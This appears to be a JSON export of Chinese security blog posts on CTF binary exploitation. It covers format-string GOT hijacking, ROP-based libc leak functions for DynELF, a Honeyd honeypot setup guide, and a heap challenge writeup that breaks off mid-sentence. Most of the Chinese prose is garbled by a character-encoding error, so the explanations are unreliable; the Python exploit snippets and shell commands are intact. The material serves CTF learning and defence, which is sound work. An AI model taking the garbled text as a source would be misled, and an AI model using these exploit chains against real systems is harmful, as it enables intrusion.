ä¸ºè¿™æ˜¯å¤§ç«¯å­˜å‚¨ï¼Œæ‰€ä»¥å†™å…¥çš„é¡ºåºéœ€è¦è®¡ç®—ä¸€ä¸‹ï¼Œé˜²æ­¢å‡ºç°\\x00å¯¼è‡´å­—ç¬¦ä¸²è¾“å…¥æˆªæ–­ã€‚\n\n \n\nâ–²ç‰¹æ®Šæ ¼å¼åŒ–å­—ç¬¦ä¸²è°ƒç”¨ç±»ï¼šFmtstr\n\nä»¥ä¸Šçš„å¯ä»¥ç›´æ¥æ”¹æˆï¼šfmtstr_payload(5, {printf_got_addr:system_plt})å°†æ ˆä¸Šåç§»é‡ä¸º6çš„å€¼æ”¹æˆprintf_got_addrï¼ŒåŒæ ·å°†printf_got_addrçš„å€¼ä¿®æ”¹ä¸ºsystem_plt_addrã€‚ä¹Ÿå°±æ˜¯åœ¨ç¬¬ä¸€æ¬¡ç”¨pringtfæ—¶ï¼Œä¼šä¿®æ”¹æ ˆå’ŒåŠ«æŒprintf_got_addrä¸ºsystem_plt_addrã€‚ä¸‹ä¸€æ¬¡å†è°ƒç”¨printfæ—¶ï¼Œä»printf_got_addræŒ‡å‘çš„å°±ä¼šæ˜¯system_plt_addrï¼Œå®ŒæˆåŠ«æŒã€‚\n\nä½†æ˜¯å¦‚æœä¸€æ—¦printf_got_addrå‡ºç°\\x00æˆ–è€…ä¸åŒè¾“å…¥å‡½æ•°æ‰€å¯¹åº”çš„éæ³•å­—ç¬¦ï¼Œå°±ä¼šå‘ç”Ÿæˆªæ–­ï¼Œå¯¼è‡´å‡ºé”™ã€‚å› ä¸ºFmtstræ¨¡å—åˆ›é€ çš„payloadä¸­åœ°å€ä¼šè¢«åˆ‡å‰²æˆå‡ æ®µï¼Œç›¸å½“äºæˆ‘ä»¬çš„å¤šæ®µæ‰§è¡Œï¼Œé‚£ä¹ˆæœ€åçš„å‡ ä¸ªåœ°å€å¦‚æœå…¶ä¸­ä¸€ä¸ªå¸¦äº†éæ³•å­—ç¬¦å°±ä¼šå‡ºé”™ã€‚\n\n \n\nâ–²printfå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å¸¸è§æœ‰\n\n(1)%dï¼Œ%fï¼Œ%cï¼Œ%sï¼Œï¼ˆç”¨äºè¯»å–å†…å­˜æ•°æ®ï¼‰\n\n(2)%xï¼ˆè¾“å‡º16è¿›åˆ¶æ•°ï¼Œå‰é¢æ²¡æœ‰0xï¼‰ï¼Œ%pï¼ˆè¾“å‡º16è¿›åˆ¶æ•°ï¼Œå‰é¢å¸¦æœ‰0xï¼‰\n\n(3)é™¤äº†%nï¼Œ%hnï¼Œ%hhnï¼Œ%llnï¼Œåˆ†åˆ«å¯¹åº”å†™å…¥ç›®æ ‡ç©ºé—´4å­—èŠ‚ï¼Œ2å­—èŠ‚ï¼Œ1å­—èŠ‚ï¼Œ8å­—èŠ‚ã€‚\n\nâ–²ç”±äºä½¿ç”¨%nä¹‹ç±»çš„æ§åˆ¶å­—ç¬¦ï¼Œè¾“å…¥çš„str(addr)ä¸ºä»¥å­—ç¬¦ä¸²å½¢å¼è¾“å…¥ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šè½¬æ¢æˆåè¿›åˆ¶ç„¶åè½¬æ¢æˆå¯¹åº”çš„asciiç æ¥å­˜å‚¨åœ¨æ ˆä¸Šï¼Œæ‰€ä»¥ä¸ä¼šå‡ºç°0x00è¿™ç±»çš„å­—ç¬¦ã€‚ä½†æ˜¯å¦‚æœæ˜¯éœ€è¦å†™å…¥çš„åœ°å€ï¼Œä½¿ç”¨çš„æ˜¯p64æˆ–è€…p32ï¼Œè¿™ä¸ªå°±æ˜¯ç›´æ¥å¯¹åº”çš„ï¼Œå¦‚æœè¿™ä¸ªåœ°å€ä¸­æœ‰00ï¼Œé‚£ä¹ˆå°±ä¸ä¼šè¢«readå‡½æ•°è¯»å–è¿›å…¥ã€‚å› ä¸ºreadå‡½æ•°é»˜è®¤ç»“å°¾æ˜¯0x00ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²ç»“æŸç¬¦å·ã€‚æ‰€ä»¥è¿™ç§æƒ…å†µä¸‹ä¸€èˆ¬éƒ½æ˜¯å°†p64(addr)æ”¾åœ¨payloadçš„æœ«å°¾ï¼Œä»è€Œè‡ªåŠ¨ç”Ÿæˆ00ï¼Œä¸ä¼šå¯¼è‡´è¢«æˆªæ–­ã€‚\n\n \n\nâ˜…æŠ€å·§æ€»ç»“:\n\n1.åŠ«æŒæŸå‡½æ•°ä¸ºsystemå‡½æ•°æ—¶ï¼Œæ˜¯å°†Gotè¡¨åŠ«æŒä¸ºpltè¡¨ï¼Œå¹¶ä¸”è¯¥å‡½æ•°çš„æ€»ä½“ç»“æ„åº”è¯¥ä¸systemå‡½æ•°ç±»ä¼¼ï¼Œå‚æ•°åº”è¯¥æ˜¯ä¸€ä¸ªåœ°å€ã€‚\n\n2.fmtstræ¨¡å—çš„ç”¨æ³•éœ€è¦æ³¨æ„ï¼Œæœ‰æ—¶å€™ä¹Ÿä¸å¤ªå¥½ç”¨ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["Fmstr"],"categories":["PWN","Fmstr0x6"]},{"title":"é€šè¿‡æ ˆæº¢å‡ºè·å–libcåœ°å€æ±‡æ€»","url":"/2021/08/14/é€šè¿‡æ ˆæº¢å‡ºè·å–libcåœ°å€æ±‡æ€»/","content":"\nä¸€ã€ä½¿ç”¨LibcSearch\n\n \n\näºŒã€ä½¿ç”¨DynELFæ¥æ³„éœ²ï¼š\n\n1.ä½¿ç”¨writeå‡½æ•°ï¼Œä¸‰ä¸ªå‚æ•°å¸ƒå±€\n\nâ˜…32ä½ç¨‹åºï¼šç›´æ¥åœ¨æ ˆä¸Šç»™å‡ºå‚æ•°\n\nç›´æ¥è®©writeè¿”å›åˆ°startå‡½æ•°åˆå§‹åŒ–ç¨‹åº(å¤šç”¨äºæ ˆæº¢å‡ºå­—èŠ‚æ•°è¾ƒå°‘)\n\n```\n#æ³¨é‡Šå¤´\n\ndef leak(addr):\n#io.recv(),çœ‹å…·ä½“æƒ…å†µæ˜¯å¦è¦å…ˆæ¥æ”¶\n    payload = ''\n    payload += 'A'*n #padding\n    payload += p32(write_addr) #è°ƒç”¨write\n    payload += p32(start_addr) #writeè¿”å›åˆ°startï¼Œæ¢å¤æ ˆ\n    payload += p32(1) #writeç¬¬ä¸€ä¸ªå‚æ•°fd\n    payload += p32(addr) #writeç¬¬äºŒä¸ªå‚æ•°buf\n    payload += p32(8) #writeç¬¬ä¸‰ä¸ªå‚æ•°size\n    io.sendline(payload)\n    data = io.recv()[:8] #æ¥å—å†…å®¹è¯»å–é€šè¿‡writeæ‰“å°çš„åœ°å€\n    print(\"%#x -> %s\" %(addr, (data or '').encode('hex')))\n    #è¿™é‡Œæ‰“å°ä¸éœ€è¦ä¹Ÿå¯ä»¥ï¼Œåªæ˜¯å¯ä»¥æ‰“å°å‡ºæ¥è®©æˆ‘ä»¬çœ‹åˆ°writeæ‰“å°äº†ä»€ä¹ˆåœ° å€ï¼ŒåŸºæœ¬éƒ½æ‰“å°äº†\n    return data\n    #è¿™é‡Œreturnçš„dataæœ‰å¾ˆå¤šåœ°å€ï¼Œéœ€è¦é€šè¿‡ä¹‹åçš„DynELFæ¥lookupå¯¹åº”çš„ åœ°å€\n```\n\nâ˜…64ä½ç¨‹åºï¼šåˆ©ç”¨ä¸‡èƒ½gadgetæ¥èµ‹äºˆå‚æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef leak(addr):\n    #print p.recv()ï¼Œçœ‹å…·ä½“æƒ…å†µæ˜¯å¦è¦å…ˆæ¥æ”¶\n    payload = \"A\" * 24\n    payload += p64(pop6_addr) #ä¸‡èƒ½gadget1\n    payload += p64(0)\n    payload += p64(1)\n    payload += p64(write_got_addr) #æ³¨æ„è¿™é‡Œä¸èƒ½ç”¨pltè¡¨\n    payload += p64(8)\n    payload += p64(addr)\n    payload += p64(1)#writeçš„å‚æ•°fdï¼Œ1ä»£è¡¨stdoutæ ‡å‡†è¾“å‡º\n    payload += p64(mov_call_addr) #ä¸‡èƒ½gadget2\n    payload += \"A\" * 56\n    #paddingè¿‡æ‰ä¸‡èƒ½gadget2çš„åˆ¤æ–­è¯­å¥ï¼Œæ¥ä¸Šä¸‡èƒ½gadget1ï¼Œç”¨æ¥å¡«å……æ ˆ\n    payload += p64(startAddress)#è·³è½¬startï¼Œæ¢å¤æ ˆ\n    p.send(payload)\n    data = p.recv(4)\n    print (\"%#x => %s\" % (address, (data or '').encode('hex'))\n    return data\n```\n\n2.ä½¿ç”¨putå‡½æ•°ï¼šä¸€ä¸ªå‚æ•°å¸ƒå±€\n\nputså‡½æ•°æ¯”è¾ƒå¥½è°ƒç”¨ï¼Œ32ä½ä¸‹ç›´æ¥åœ¨æ ˆä¸Šå¸ƒå±€å°±å¥½ï¼Œ64ä½ä¸‹ç”¨ä¸€ä¸ªpop rdiå°±å®Œäº‹ã€‚\n\nputsçš„åŸå‹æ˜¯puts(addr)ï¼Œå³å°†addrä½œä¸ºèµ·å§‹åœ°å€è¾“å‡ºå­—ç¬¦ä¸²ï¼Œç›´åˆ°é‡åˆ°â€œ\\x00â€å­—ç¬¦ä¸ºæ­¢ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œputså‡½æ•°è¾“å‡ºçš„æ•°æ®é•¿åº¦æ˜¯ä¸å—æ§çš„ï¼Œåªè¦æˆ‘ä»¬è¾“å‡ºçš„ä¿¡æ¯ä¸­åŒ…å«\\x00æˆªæ–­ç¬¦ï¼Œè¾“å‡ºå°±ä¼šç»ˆæ­¢ï¼Œä¸”ä¼šè‡ªåŠ¨å°†\"\\n\"è¿½åŠ åˆ°è¾“å‡ºå­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œæ‰€ä»¥è¿™é‡Œå°±éœ€è¦é’ˆå¯¹leakå‡½æ•°åšç‰¹æ®Šå¤„ç†ã€‚ä½†ç»“æŸä¸å¤ªå¥½åˆ¤æ–­ï¼Œå¦‚æœåªç”¨\\næ¥åˆ¤æ–­ï¼Œé‚£ä¹ˆå¦‚æœéœ€è¦æ³„éœ²çš„åœ°å€æœ€åä¸¤ä¸ªå­—èŠ‚ä¸­çš„æœ‰æ•ˆä½ä¸­å¸¦æœ‰\\n(0x0a)ï¼Œé‚£åŒæ ·ä¼šæˆªæ–­ï¼Œå¯¼è‡´æ— æ³•å®Œå…¨è¾“å‡ºã€‚æ‰€ä»¥è¿™é‡Œç”¨\\nå’Œtimeoutæ¥åˆ¤æ–­ï¼Œå½“ç»“æŸå­—ç¬¦\\nå‡ºç°ï¼Œå¹¶ä¸”è®¾ç½®è¶…æ—¶æœºåˆ¶ï¼Œå‡ºç°ç»“æŸå­—ç¬¦å¹¶ä¸”æ²¡æœ‰ä¸œè¥¿å†è¾“å‡ºäº†ï¼Œé‚£å°±ä»£è¡¨æ˜¯çœŸçš„ç»“æŸäº†ã€‚ç”±äºæ˜¯ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚å¤„ç†ï¼Œæ‰€ä»¥å¦‚æœputså‡½æ•°è¾“å‡ºå®Œåè¿˜æœ‰å…¶å®ƒçš„è¾“å‡ºï¼Œé‚£ä¹ˆå°±æ²¡åŠæ³•çŸ¥é“0x0aåˆ°åº•æ˜¯putè¾“å‡ºçš„è¿˜æ˜¯ä¹‹åçš„è¾“å‡ºå‡½æ•°è¾“å‡ºçš„ï¼Œè¿™é‡Œä¸»è¦è®¨è®ºåœ¨è¿™ä¸¤ç§æƒ…å†µï¼š\n\n(è¿™é‡Œä¹Ÿæ˜¯å› ä¸ºTCPæ¡æ‰‹åŸå› ï¼ŒTCPä¼ è¾“æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½è¿›è¡Œç¼–ç ä¼ è¾“çš„)\n\nâ˜…putsè¾“å‡ºå®Œåæ²¡æœ‰å…¶å®ƒè¾“å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef leak(address):\n    count = 0\n    data = ''\n    payload = xxx\n    p.send(payload)\n    print p.recvuntil('xxxn') #ä¸€å®šè¦åœ¨putså‰é‡Šæ”¾å®Œè¾“å‡º\n    up = \"\"\n    while True:\n    #ç”±äºæ¥æ”¶å®Œæ ‡å¿—å­—ç¬¦ä¸²ç»“æŸçš„å›è½¦ç¬¦åï¼Œå°±æ²¡æœ‰å…¶ä»–è¾“å‡ºäº†ï¼Œæ•…å…ˆç­‰å¾…0.1ç§’é’Ÿï¼Œå¦‚æœç¡®å®æ¥æ”¶ä¸åˆ°    äº†ï¼Œå°±è¯´æ˜è¾“å‡ºç»“æŸäº†\n    #è¿™é‡Œä¸ºäº†ä¸ä¸æ ‡å¿—å­—ç¬¦ä¸²ç»“æŸçš„å›è½¦ç¬¦ï¼ˆ0x0Aï¼‰æ··æ·†ï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªåˆ¤æ–­æ¡ä»¶ã€‚è¿™ä¹Ÿåˆ©ç”¨äº†recvå‡½æ•°çš„timeoutå‚æ•°ï¼Œå³å½“timeoutç»“æŸåä»å¾—ä¸åˆ°è¾“å‡ºï¼Œåˆ™ç›´æ¥è¿”å›ç©ºå­—ç¬¦ä¸²â€â€\n        c = p.recv(numb=1, timeout=0.1)\n        count += 1\n        if up == '\\n' and c == \"\":  \n        #æ¥æ”¶åˆ°çš„ä¸Šä¸€ä¸ªå­—ç¬¦ä¸ºå›è½¦ç¬¦ï¼Œè€Œå½“å‰æ¥æ”¶ä¸åˆ°æ–°å­—ç¬¦ï¼Œåˆ™\n           buf = buf[:-1] #åˆ é™¤putså‡½æ•°è¾“å‡ºçš„æœ«å°¾å›è½¦ç¬¦\n           buf += \"x00\"\n           break\n        else:\n           buf += c\n           up = c\n    data = buf[:4]  #å–æŒ‡å®šå­—èŠ‚æ•°\n    log.info(\"%#x => %s\" % (address, (data or '').encode('hex')))\n    return data\n```\n\nâ˜…putsè¾“å‡ºå®Œåè¿˜æœ‰å…¶å®ƒè¾“å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef leak(address):\n    count = 0\n    data = ''\n    payload = xxx\n    p.send(payload)\n    print p.recvuntil('xxxn') #ä¸€å®šè¦åœ¨putså‰é‡Šæ”¾å®Œè¾“å‡º\n    up = \"\"\n    while True:\n    #ç”±äºæ¥æ”¶å®Œæ ‡å¿—å­—ç¬¦ä¸²ç»“æŸçš„å›è½¦ç¬¦åï¼Œå°±æ²¡æœ‰å…¶ä»–è¾“å‡ºäº†ï¼Œæ•…å…ˆç­‰å¾…1ç§’é’Ÿï¼Œå¦‚æœç¡®å®æ¥æ”¶ä¸åˆ°äº†ï¼Œå°±è¯´æ˜è¾“å‡ºç»“æŸäº†\n    #ä¸ä¸æ ‡å¿—å­—ç¬¦ä¸²ç»“æŸçš„å›è½¦ç¬¦ï¼ˆ0x0Aï¼‰æ··æ·†ï¼Œè¿™ä¹Ÿåˆ©ç”¨äº†recvå‡½æ•°çš„timeoutå‚æ•°ï¼Œå³å½“timeoutç»“æŸåä»å¾—ä¸åˆ°è¾“å‡ºï¼Œåˆ™ç›´æ¥è¿”å›ç©ºå­—ç¬¦ä¸²â€â€\n    c = p.recv(numb=1, timeout=1)\n    count += 1\n    if up == 'n' and c == \"X\":  \n    #æ¥æ”¶åˆ°çš„ä¸Šä¸€ä¸ªå­—ç¬¦ä¸ºå›è½¦ç¬¦ï¼Œä¸‹ä¸€ä¸ªå­—ç¬¦å¼€å¤´æ˜¯Xï¼Œé‚£å°±ç»“æŸè¾“å‡ºã€‚\n        buf = buf[:-1]             #åˆ é™¤putså‡½æ•°è¾“å‡ºçš„æœ«å°¾å›è½¦ç¬¦\n        buf += \"x00\"\n        break\n    else:\n        buf += c\n        up = c\n    data = buf[:4]  #ä»putè¾“å‡ºå¼€å¤´å–æŒ‡å®šå­—èŠ‚æ•°\n    log.info(\"%#x => %s\" % (address, (data or '').encode('hex')))\n    return data\n```\n\nâ–²ä½¿ç”¨printfå‡½æ•°ï¼šæ²¡æ‰¾åˆ°å…·ä½“ç‚¹çš„ï¼Œä½†åº”è¯¥å’Œputså‡½æ•°å·®ä¸å¤šï¼Œä»¥åé‡åˆ°å†è¯´ã€‚å·²çŸ¥ï¼š\n\né‡åˆ°\\x00å’Œ\\x0aä¼šæˆªæ–­ï¼Œç„¶åæ‰“å°çš„æ—¶å€™ä¸ä¼šæ‰“å°\\x00å’Œ\\x0a\n\n \n\nä¸‰ã€é‡è¦æ³¨æ„äº‹é¡¹ï¼š\n\næ³¨æ„ç¨‹åºçš„è¾“å…¥å‡½æ•°æ˜¯ä»€ä¹ˆï¼Œæœ‰äº›é¢˜çš„è¾“å…¥å‡½æ•°æ˜¯scanfï¼Œé‚£ä¹ˆå°±ä¸æ”¯æŒè¯»å…¥ç©ºæ ¼ï¼Œæ¢è¡Œç¬¦ï¼Œåˆ¶è¡¨ç¬¦ï¼Œè½¬æ¢æˆasciiç å°±æ˜¯ï¼š0x20ï¼Œ0x0aï¼Œ0x09ï¼Œ0x00,æ‰€ä»¥å½“ä¼ æ•°æ®çš„æ—¶å€™æœ‰è¿™äº›çš„æ—¶å€™éœ€è¦æ³¨æ„ã€‚æ›´å¤šæŸ¥èµ„æ–™æˆ–è€…è°ƒè¯•ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\nhttps://www.anquanke.com/post/id/85129\n\n \n\n \n","tags":["pwn-knowledge"],"categories":["PWN"]},{"title":"èœœç½æ­å»º","url":"/2021/08/14/èœœç½æ­å»º/","content":"\nç¯å¢ƒï¼šè™šæ‹Ÿæœºubuntu18.04ã€‚\n\n1.å®‰è£…å‰ç½®ä¾èµ–ï¼š\n\n```\nsudo apt-get install g++ gcc\nsudo apt-get install flex\nsudo apt-get install bison\nsudo apt-get install libedit-dev\n```\n\n2.ä¸‹è½½å‰ç½®å·¥å…·ï¼š\n\n```\n#æ³¨é‡Šå¤´\nlibevent-1.4.14b-stable.tar.gz   \nlibdnet-1.11.tar.gz              \nlibpcap-1.1.1.tar.gz             \narpd-0.2.tar.gz\n#æ³¨é‡Šå¤´\n\nhttp://libevent.org/\nhttp://libdnet.sourceforge.net/\nhttp://www.tcpdump.org/release/\nhttp://www.citi.umich.edu/u/provos/honeyd\n```\n\n3.å®‰è£…å·¥å…·ï¼šåŸºæœ¬éƒ½æ˜¯ç¼–è¯‘ä¸‰éƒ¨æ›²\n\n(1)å®‰è£…Libevent(éåŒæ­¥äº‹ä»¶é€šçŸ¥çš„å‡½æ•°åº“)ï¼šä½¿ç”¨libeventï¼Œå¯ä»¥è®¾å®šæŸäº›äº‹ä»¶å‘ç”Ÿæ—¶æ‰€æ‰§è¡Œçš„å‡½æ•°ï¼Œç”¨æ¥ä»£æ›¿ç¨‹åºæ‰€ä½¿ç”¨çš„å¾ªç¯æ£€æŸ¥ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nsudo tar -zxvf libevent-1.4.14b-stable.tar.gz\ncd libevent-1.4.14b-stable\nsudo ./configure\nsudo make\nsudo make install\n```\n\n(2)å®‰è£…Libdnet(æä¾›è·¨å¹³å°çš„ç½‘ç»œç›¸å…³çš„APIå‡½æ•°åº“)ï¼šåŒ…æ‹¬äº†ARPç¼“å­˜ï¼Œè·¯ç”±è¡¨æŸ¥è¯¢ï¼ŒIPåŒ…åŠç‰©ç†å¸§çš„ä¼ è¾“ç­‰ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nsudo tar -zxvf libdnet-1.11.tar.gz\ncd libdnet-1.11\nsudo ./configure\nsudo make\nsudo make install\n```\n\n(3)å®‰è£…Libpcapï¼šä¸€ä¸ªæ•°æ®åŒ…æ•è·å‡½æ•°åº“ï¼Œå¤§å¤šæ•°ç½‘ç»œè½¯ä»¶éƒ½ä»¥å®ƒä¸ºåŸºç¡€\n\n```\n#æ³¨é‡Šå¤´\n\nsudo tar -zxvf libpcap-1.1.1.tar.gz\ncd libpcap-1.1.1\nsudo ./configure\nsudo make\nsudo make install\n```\n\nä¹‹å‰è£…çš„ä¾èµ– flex bisonå°±æ˜¯ä¸ºäº†è¿™ä¸ªã€‚\n\n(4)å®‰è£…ARPDï¼ˆè¿è¡Œåœ¨ä¸Honeydç›¸åŒçš„ç³»ç»Ÿä¸Šï¼‰ï¼šarpdæ˜¯honeydä¼—å¤šåä½œå·¥å…·ä¸­æœ€é‡è¦çš„ä¸€ä¸ªå·¥å…·ã€‚å·¥ä½œæ—¶ç›‘å¬å±€åŸŸç½‘å†…çš„æµé‡ï¼Œå¹¶é€šè¿‡æŸ¥çœ‹honeydç³»ç»Ÿçš„ARPè¡¨åˆ¤æ–­å…¶ä»–ç³»ç»Ÿæ˜¯å¦å­˜æ´»ã€‚åœ¨èœœç½ç³»ç»Ÿä¸­arpdå¯ä»¥æŒ‡å®šIPåœ°å€ï¼Œå°†è¯¥ç³»ç»Ÿä¸‹çš„MACåœ°å€ä¼ªè£…æˆæŒ‡å®šIPçš„MACåœ°å€ï¼Œè¿™æ ·å¯¹æŒ‡å®šIPåœ°å€èŒƒå›´å†…æœªä½¿ç”¨çš„IPçš„è¿æ¥è®¿é—®éƒ½è¢«é‡å®šå‘åˆ°èœœç½ä¸»æœºï¼Œç„¶åå¯¹èœœç½ä¸»æœºè¿›è¡Œç›¸å…³çš„è®¾ç½®ï¼Œå°±å¯ä»¥è¯±å¯¼æ”»å‡»ï¼Œæˆªå–æµé‡ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nsudo tar -zxvf arpd-0.2.tar.gz\ncd arpd-0.2\nsudo ./configure\n#æŠ¥é”™ï¼šerrorï¼šexpectedâ€™)â€™ before string constant\n#è§£å†³ï¼šåœ¨arpd.cæ–‡ä»¶ä¸­æ·»åŠ #define __FUNCTION__ \"\" #vim arpd.cæ·»åŠ å®šä¹‰\nsudo make\nsudo make install\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452748.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452811.png)\n\n4.å®‰è£…èœœç½å·¥å…·Honeydï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nsudo tar -zxvf honeyd-1.5c.tar.gz\ncd honeyd-1.5c\nsudo ./configure\n#æŠ¥é”™ï¼šconfigure: error: Couldn't figure out how to access libc\n#è§£å†³ï¼šsudo ln -s /lib/x86_64-linux-gnu/libc.so.6 /usr/lib/libc.so\nsudo make\nsudo make install\n```\n\n5.å…ˆå°†arpdè¿è¡Œèµ·æ¥ï¼š\n\n(1)è¿è¡Œåæ˜¾ç¤ºé“¾æ¥ä¸å­˜åœ¨ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452140.png)\n\n(2)è§£å†³åŠæ³•ï¼šæ‰¾åˆ°libevent-1.4.so.2çš„ä½ç½®ï¼Œç„¶åå°†ä½ç½®åŠ åˆ°å®šä½çš„æ–‡ä»¶ä¸­\n\nwhereis libevent-1.4.so.2\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452134.png)\n\nsudo vim /etc/ld.so.conf\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452265.png)\n\nsudo ldconfig #é‡æ–°åŠ è½½é“¾æ¥\n\n(3)ä¹‹åé€‰å®šç½‘å¡ï¼Œå³å¯æ¨¡æ‹ŸIPï¼Œä¼ªè£…IPçš„MACåœ°å€\n\nsudo arpd -i ens33 192.168.1.71\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452193.png)\n\nâ–²è¿™é‡Œçš„ens33æ˜¯ubuntuä¸‹ç”¨ip addræŸ¥åˆ°çš„ï¼Œä¸åŒç³»ç»Ÿå¯èƒ½ä¸åŒã€‚\n\n6.æ£€æµ‹Honeydæ˜¯å¦å¯ä»¥è¿è¡Œï¼š\n\n(1)è®¾ç½®å¯åŠ¨å‚æ•°vim honeyd.confï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n# Example of a simple host template and its binding\ncreate windows\n\n#åˆ›å»ºä¸€ä¸ªwindows xpç³»ç»Ÿçš„èœœç½\nset windows personality \"Microsoft Windows XP Professional SP1\"\n\n#å¼€å¯80ç«¯å£webæœåŠ¡ä¸”ä¾¦å¬è„šæœ¬ä¸ºhoneyd-1.5c/scripts/web.sh\nadd windows tcp port 80 \"sh /home/hacker/Desktop/Web/Honey/honeyd-    1.5c/scripts/web.sh\"\n\n#å…³é—­é»˜è®¤çš„tcp,udpè¿æ¥\nset windows default tcp action reset\nset windows default udp action reset\n\n#å°†windowsè¿™ä¸ªèœœç½çš„ipç»‘å®šä¸º192.168.40.150\nbind 192.168.40.150 windows\n```\n\nâ–²æ³¨æ„è¿™é‡Œé¢è®¾ç½®çš„IPæ˜¯åœ¨å±€åŸŸç½‘ä¸‹çš„ï¼Œä¸”è¿˜æ²¡æœ‰è¢«DHCPåˆ†é…å‡ºå»çš„å¯ç”¨IPã€‚åŒæ—¶è®¾ç½®äº†è¯¥IPä¸»æœºä¸‹çš„80ç«¯å£ï¼Œè¿™æ ·å…¶ä»–ç”¨æˆ·åœ¨è®¿é—®è¯¥IPçš„80ç«¯å£æ—¶å°±ä¼šè¿è¡Œ(Webè®¿é—®)\n\nsh /home/hacker/Desktop/Web/Honey/honeyd- 1.5c/scripts/web.sh\n\nè¿™æ¡å‘½ä»¤ï¼Œç„¶åè¿”å›ç›¸åº”çš„ä¿¡æ¯ã€‚\n\n(2)è®¾ç½®web.shè„šæœ¬(è¿™å¯ä»¥éšä¾¿è®¾ç½®ï¼Œåˆ¶ä½œä¸€ä¸ªwebå‰ç«¯å³å¯ï¼Œå¸¸ç”¨æ¥é’“é±¼)ï¼Œåœ¨honeyd.confä¸­è®¾ç½®è·¯å¾„ï¼šåœ¨scriptsä¸‹åŸæœ¬å­˜åœ¨ä¸€ä¸ªè‡ªå¸¦çš„è„šæœ¬ï¼Œè¯¥è„šæœ¬è¢«å…¶ä»–äººè®¿é—®è¿è¡ŒæˆåŠŸåå‘ˆç°å¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452534.png)\n\n(3)å¯åŠ¨èœœç½honeydï¼š\n\nhoneyd -d -f honeyd.conf 192.168.1.2\n\nâ–²è¿™æ ·ä¸€ä¸ªèœœç½å°±æ­å»ºèµ·æ¥äº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æ­å»ºæ­¥éª¤å¤§æ¦‚åˆ†ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š\n\nâ‘ åˆ©ç”¨arpdè™šæ‹ŸIPã€‚\n\nâ‘¡åœ¨honeyçš„å¯åŠ¨å‚æ•°ä¸­ï¼Œä¹Ÿå°±æ˜¯honey.confä¸­ç»‘å®šè™šæ‹Ÿçš„ä¸»æœºåˆ°è™šæ‹ŸIPã€‚\n\nâ‘¢åœ¨honey.confä¸­è®¾ç½®è™šæ‹Ÿä¸»æœºçš„ç›¸å…³ç«¯å£ï¼Œåè®®ç­‰å‚æ•°ã€‚\n\nâ‘£è®¾ç½®ç«¯å£è¿æ¥åçš„è¿”å›ä¿¡æ¯ï¼Œç±»ä¼¼äº80ç«¯å£çš„web.shï¼Œæˆ–è€…sshè¿æ¥ç«¯å£çš„é¡µé¢ç­‰ç­‰ã€‚\n\nâ‘¤å¯åŠ¨honeyï¼Œç­‰å¾…é±¼å„¿ä¸Šé’©ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://www.dazhuanlan.com/2019/12/17/5df842503e7a9/\n\nhttps://blog.csdn.net/accepthjp/article/details/46399715\n\nhttps://blog.csdn.net/zhangxuechao_/article/details/80261502\n\n \n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"CISCN-BUUåˆ·é¢˜è®°å½•3","url":"/2021/08/14/CISCN-BUUåˆ·é¢˜è®°å½•3/","content":"\n1.ciscn_final_5ï¼šç”±äºé¢˜ç›®æœ¬èº«åŸå› ï¼ŒchunkListä¸­å­˜æ”¾çš„å †åœ°å€æ˜¯chunk_addr+idxï¼Œæ‰€ä»¥idxä¸º16æ—¶å°±ä¼šå¯¼è‡´å­˜æ”¾çš„å †åœ°å€ä¸ºchunk_addr+0x10ã€‚åŒæ—¶æ”¾å…¥chunkListçš„é¡ºåºæ˜¯æŒ‰ç…§ç”³è¯·é¡ºåºæ”¾å…¥çš„ï¼Œåˆ é™¤å’Œä¿®æ”¹çš„æ—¶å€™ä¹Ÿæ˜¯é€šè¿‡éå†æŸ¥æ‰¾çš„ã€‚é‚£ä¹ˆå¦‚æœå…ˆç”³è¯·ç´¢å¼•ä¸º16ï¼Œ1çš„chunkï¼ŒchunkListä¸­å°±ä¼šå¦‚ä¸‹ï¼š\n\nchunk16_addr+0x10,chunk1_addr\n\nå¦‚æœè¿™æ—¶å€™é‡Šæ”¾ç´¢å¼•ä¸º0çš„Chunkï¼Œå°±ä¼šè¯¯ä»¥ä¸ºchunk16_addr+0x10ä¸ºç´¢å¼•ä¸º0çš„chunkï¼Œå¦‚æœäº‹å…ˆä¼ªé€ äº†chunk16_addr+0x10çš„sizeåŸŸï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿå°†å…¶é‡Šæ”¾ï¼Œå†ç”³è¯·å›æ¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¤Ÿåˆ¶é€ å 